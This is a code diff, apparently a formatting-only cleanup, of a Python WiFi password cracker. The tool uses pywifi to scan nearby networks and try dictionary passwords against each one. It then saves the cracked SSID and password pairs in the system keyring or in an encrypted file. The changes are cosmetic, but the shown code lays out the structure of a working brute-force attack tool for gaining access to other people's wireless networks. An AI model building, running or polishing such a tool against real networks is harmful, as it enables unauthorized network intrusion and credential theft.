@@ -29,8 +29,7 @@ import argparse
 import sys
 import getpass
 import base64
-import os
-from typing import List, Optional, Set, Tuple, Dict, Any
+from typing import List, Optional, Set
 
 import pywifi
 from pywifi import const
@@ -41,6 +40,7 @@ from pywifi import const
 
 try:
     import keyring
+
     HAS_KEYRING = True
 except ImportError:
     HAS_KEYRING = False
@@ -49,6 +49,7 @@ try:
     from cryptography.fernet import Fernet
     from cryptography.hazmat.primitives import hashes
     from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
     HAS_CRYPTO = True
 except ImportError:
     HAS_CRYPTO = False
@@ -57,6 +58,7 @@ except ImportError:
 # ------------------------------------------------------------------------------
 # Command‑line argument parsing
 # ------------------------------------------------------------------------------
+
 
 def parse_arguments() -> argparse.Namespace:
     """
@@ -78,31 +80,31 @@ def parse_arguments() -> argparse.Namespace:
     parser.add_argument(
         "--dict",
         required=True,
-        help="Path to the password dictionary file (one password per line)."
+        help="Path to the password dictionary file (one password per line).",
     )
     parser.add_argument(
         "--max",
         type=int,
         default=5,
-        help="Maximum number of visible WiFi networks to attempt (default: 5)."
+        help="Maximum number of visible WiFi networks to attempt (default: 5).",
     )
     parser.add_argument(
         "--exclude",
         nargs="*",
         default=[],
-        help="List of SSIDs to exclude from cracking (e.g., --exclude HomeNet Office)."
+        help="List of SSIDs to exclude from cracking (e.g., --exclude HomeNet Office).",
     )
     parser.add_argument(
         "--store",
         choices=["keyring", "encrypted"],
         default="keyring",
         help="Storage method for discovered passwords: 'keyring' (system keychain) or "
-             "'encrypted' (AES‑encrypted file). Default is 'keyring'."
+        "'encrypted' (AES‑encrypted file). Default is 'keyring'.",
     )
     parser.add_argument(
         "--output",
         default="found.enc",
-        help="Path to the encrypted output file (only used when --store is 'encrypted')."
+        help="Path to the encrypted output file (only used when --store is 'encrypted').",
     )
     return parser.parse_args()
 
@@ -110,6 +112,7 @@ def parse_arguments() -> argparse.Namespace:
 # ------------------------------------------------------------------------------
 # WiFi interface management
 # ------------------------------------------------------------------------------
+
 
 def get_wifi_interfaces() -> Optional[pywifi.Interface]:
     """
@@ -137,8 +140,9 @@ def disconnect_iface(iface: pywifi.Interface) -> None:
     time.sleep(1)  # Allow the disconnection to complete
 
 
-def scan_networks(iface: pywifi.Interface, max_networks: int,
-                  exclude: Set[str]) -> List[str]:
+def scan_networks(
+    iface: pywifi.Interface, max_networks: int, exclude: Set[str]
+) -> List[str]:
     """
     Scan for visible WiFi networks and return a filtered list of SSIDs.
 
@@ -215,6 +219,7 @@ def test_password(iface: pywifi.Interface, ssid: str, password: str) -> bool:
 # Secure storage helpers
 # ------------------------------------------------------------------------------
 
+
 def store_in_keyring(ssid: str, password: str) -> bool:
     """
     Store the discovered password in the system keyring.
@@ -250,17 +255,21 @@ def get_encryption_cipher() -> Optional[Fernet]:
         not installed or the user did not provide a passphrase.
     """
     if not HAS_CRYPTO:
-        print("❌ The 'cryptography' library is not installed. Cannot use encrypted storage.")
+        print(
+            "❌ The 'cryptography' library is not installed. Cannot use encrypted storage."
+        )
         return None
 
     try:
-        pwd = getpass.getpass("Enter an encryption passphrase (keep it safe; loss = data loss): ")
+        pwd = getpass.getpass(
+            "Enter an encryption passphrase (keep it safe; loss = data loss): "
+        )
         if not pwd:
             print("No passphrase entered. Encryption aborted.")
             return None
 
         # Fixed salt (in production, generate a random salt and save it alongside the encrypted file)
-        salt = b'wifi_salt_2026'
+        salt = b"wifi_salt_2026"
         kdf = PBKDF2HMAC(
             algorithm=hashes.SHA256(),
             length=32,
@@ -292,7 +301,7 @@ def store_encrypted(ssid: str, password: str, cipher: Fernet, output_file: str) 
     """
     try:
         encrypted = cipher.encrypt(f"{ssid}:{password}".encode())
-        with open(output_file, "ab") as f:   # 'ab' = append binary
+        with open(output_file, "ab") as f:  # 'ab' = append binary
             f.write(encrypted + b"\n")
         return True
     except Exception as e:
@@ -304,8 +313,14 @@ def store_encrypted(ssid: str, password: str, cipher: Fernet, output_file: str) 
 # Main brute‑force routine
 # ------------------------------------------------------------------------------
 
-def brute_force(iface: pywifi.Interface, ssid_list: List[str],
-                dict_path: str, store_method: str, output_file: str) -> None:
+
+def brute_force(
+    iface: pywifi.Interface,
+    ssid_list: List[str],
+    dict_path: str,
+    store_method: str,
+    output_file: str,
+) -> None:
     """
     Orchestrate the brute‑force process: iterate over passwords, test each SSID,
     and store found credentials securely.
@@ -329,7 +344,9 @@ def brute_force(iface: pywifi.Interface, ssid_list: List[str],
 
     # Validate and prepare storage backend
     if store_method == "keyring" and not HAS_KEYRING:
-        print("⚠️  'keyring' library not available. Falling back to encrypted file storage.")
+        print(
+            "⚠️  'keyring' library not available. Falling back to encrypted file storage."
+        )
         store_method = "encrypted"
 
     cipher = None
@@ -350,8 +367,8 @@ def brute_force(iface: pywifi.Interface, ssid_list: List[str],
         print(f"❌ Error reading dictionary: {e}")
         sys.exit(1)
 
-    found = {}                     # Temporary in‑memory store for fallback
-    remaining = set(ssid_list)     # SSIDs still not cracked
+    found = {}  # Temporary in‑memory store for fallback
+    remaining = set(ssid_list)  # SSIDs still not cracked
     attempt = 0
 
     # Main loop: iterate over each password
@@ -373,9 +390,13 @@ def brute_force(iface: pywifi.Interface, ssid_list: List[str],
                 if store_method == "keyring":
                     success = store_in_keyring(ssid, pwd)
                     if success:
-                        print(f"   🔐 Stored in system keyring (service: wifi_cracker, account: {ssid})")
+                        print(
+                            f"   🔐 Stored in system keyring (service: wifi_cracker, account: {ssid})"
+                        )
                     else:
-                        print(f"   ⚠️  Keyring store failed. Falling back to encrypted file.")
+                        print(
+                            "   ⚠️  Keyring store failed. Falling back to encrypted file."
+                        )
                         # Try encrypted file as a fallback
                         if cipher is None:
                             cipher = get_encryption_cipher()
@@ -393,7 +414,9 @@ def brute_force(iface: pywifi.Interface, ssid_list: List[str],
                 # If all storage methods failed, keep it only in memory
                 if not success:
                     found[ssid] = pwd
-                    print(f"   ⚠️  No persistent storage available. Credential kept in memory only (lost on exit).")
+                    print(
+                        "   ⚠️  No persistent storage available. Credential kept in memory only (lost on exit)."
+                    )
             else:
                 # Connection failed, disconnect to clean up before next attempt
                 disconnect_iface(iface)
@@ -412,6 +435,7 @@ def brute_force(iface: pywifi.Interface, ssid_list: List[str],
 # ------------------------------------------------------------------------------
 # Entry point
 # ------------------------------------------------------------------------------
+
 
 def main() -> None:
     """
